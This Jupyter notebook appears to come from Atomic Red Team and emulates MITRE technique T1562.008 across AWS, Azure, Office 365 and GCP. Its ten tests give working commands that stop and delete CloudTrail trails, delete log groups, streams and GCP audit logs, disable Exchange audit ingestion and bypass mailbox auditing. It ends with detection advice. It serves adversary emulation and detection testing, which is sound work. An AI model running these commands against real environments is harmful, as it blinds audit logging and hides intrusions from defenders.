{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "455769a1",
   "metadata": {},
   "source": "# T1562.008 - Disable or Modify Cloud Logs\nAn adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)"
  },
  {
   "cell_type": "markdown",
   "id": "15d405ef",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "57fb1cfa",
   "metadata": {},
   "source": "### Atomic Test #1 - AWS - CloudTrail Changes\nCreates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS default profile using: aws configure\n\n```\n##### Description: Check if terraform is installed.\n\n##### Check Prereq Commands:\n```sh\nterraform version\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the terraform and configure your aws default profile \n\n```\n##### Description: Check if the dependency resources are already present.\n\n##### Check Prereq Commands:\n```sh\nif [ -f \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\ncd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform init\nterraform apply -auto-approve\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0d47724",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "be3e7e7e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws cloudtrail update-trail --name redatomictesttrail --s3-bucket-name redatomic-test  --is-multi-region-trail --region us-east-1\naws cloudtrail stop-logging --name redatomictesttrail --region us-east-1\naws cloudtrail delete-trail --name redatomictesttrail --region us-east-1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1751e5ff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "b855da38",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\ncd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform destroy -auto-approve\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9597fedf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5209a78b",
   "metadata": {},
   "source": "### Atomic Test #2 - Azure - Eventhub Deletion\nIdentifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n\n**Supported Platforms:** iaas:azure\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Install-Module -Name Az\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```\n##### Description: Check if terraform is installed.\n\n##### Check Prereq Commands:\n```powershell\nterraform version\n\n```\n##### Get Prereq Commands:\n```powershell\necho Please install the terraform.\n\n```\n##### Description: Check if the user is logged into Azure.\n\n##### Check Prereq Commands:\n```powershell\naz account show\n\n```\n##### Get Prereq Commands:\n```powershell\necho Configure your Azure account using: az login. \n\n```\n##### Description: Create dependency resources using terraform\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Test-Path \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\ncd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform init\nterraform apply -auto-approve\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "067926ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3fb9715f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName None -Namespace None -Name test_eventhub\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39678c6e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d35a6692",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ncd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform destroy -auto-approve\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0940216",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "92eccab1",
   "metadata": {},
   "source": "### Atomic Test #3 - Office 365 - Exchange Audit Log Disabled\nYou can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n\n**Supported Platforms:** office-365\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ExchangeOnlineManagement PowerShell module must be installed\n\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f5a54b1c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b27aae2a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a1d0ef5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "1830f7ec",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "338c4852",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1080a68f",
   "metadata": {},
   "source": "### Atomic Test #4 - AWS - Disable CloudTrail Logging Through Event Selectors using Stratus\nUpdate event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n\n**Supported Platforms:** linux, macos, iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Stratus binary must be present at the (#{stratus_path}/stratus)\n\n##### Check Prereq Commands:\n```sh\nif [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nfi\n\n```\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4cf4811b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f7533c3f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nexport AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e34e36ab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "060d50d6",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nexport AWS_REGION=us-west-2\necho \"Cleanup detonation\"\ncd $PathToAtomicsFolder/T1562.008/src\n./stratus cleanup --all\nrm -rf stratus*\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6fc5e23",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9e164cbc",
   "metadata": {},
   "source": "### Atomic Test #5 - AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus\nThis Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n\n**Supported Platforms:** linux, macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Stratus binary must be present at the (#{stratus_path}/stratus)\n\n##### Check Prereq Commands:\n```sh\nif [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nfi\n\n```\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25fb540d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "959958c2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nexport AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6def4554",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "87ddc057",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nexport AWS_REGION=us-west-2\necho \"Cleanup detonation\"\ncd $PathToAtomicsFolder/T1562.008/src\n./stratus cleanup --all\nrm -rf stratus*\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "188233e8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a2ba536a",
   "metadata": {},
   "source": "### Atomic Test #6 - AWS - Remove VPC Flow Logs using Stratus\nThis Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n\n**Supported Platforms:** linux, macos, iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Stratus binary must be present at the (#{stratus_path}/stratus)\n\n##### Check Prereq Commands:\n```sh\nif [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/\nfi\n\n```\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "992a45db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cf928281",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nexport AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aaa1e689",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "b37b98f4",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nexport AWS_REGION=us-west-2\necho \"Cleanup detonation\"\ncd $PathToAtomicsFolder/T1562.008/src\n./stratus cleanup --all\nrm -rf stratus*\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5b40e41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1cf7cd3c",
   "metadata": {},
   "source": "### Atomic Test #7 - AWS - CloudWatch Log Group Deletes\nCreates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3f6b60f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "36a3b6b6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws logs create-log-group --log-group-name log-test --region us-east-1 --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name log-test --region us-east-1 --output json\necho \"*** Log Group Deleted ***\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2f04a09",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "74bcd060",
   "metadata": {},
   "source": "### Atomic Test #8 - AWS CloudWatch Log Stream Deletes\nCreates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "516c7e21",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "960b6205",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws logs create-log-group --log-group-name test-logs --region us-west-2 --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name test-logs --log-stream-name 20150601\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name test-logs --log-stream-name 20150601\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name test-logs --region us-west-2 --output json\necho \"*** Log Group Deleted ***\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d31bd31",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "2de19444",
   "metadata": {},
   "source": "### Atomic Test #9 - Office 365 - Set Audit Bypass For a Mailbox\nUse Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n\n**Supported Platforms:** office-365\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ExchangeOnlineManagement PowerShell module must be installed\n\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a41cb63",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6765b106",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $true\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82671811",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "75330e87",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $false\nDisconnect-ExchangeOnline -Confirm:$false\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80751cd1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "abda26fe",
   "metadata": {},
   "source": "### Atomic Test #10 - GCP - Delete Activity Event Log\nGCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n\n**Supported Platforms:** iaas:gcp\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Requires gcloud\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n\n```\n##### Description: Check if user is logged in \n\n##### Check Prereq Commands:\n```sh\ngcloud config get-value account\n\n```\n##### Get Prereq Commands:\n```sh\ngcloud auth login --no-launch-browser\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b74a5c4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ac8378a9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ngcloud config set project atomic-project-1\ngcloud logging logs delete projects/atomic-project-1/logs/cloudaudit.googleapis.com%2Factivity --quiet\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e243b8d4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.008 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "d663a006",
   "metadata": {},
   "source": "## Detection\nMonitor logs for API calls to disable logging. In AWS, monitor for: <code>StopLogging</code> and <code>DeleteTrail</code>.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs)  In Azure, monitor for <code>az monitor diagnostic-settings delete</code>.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}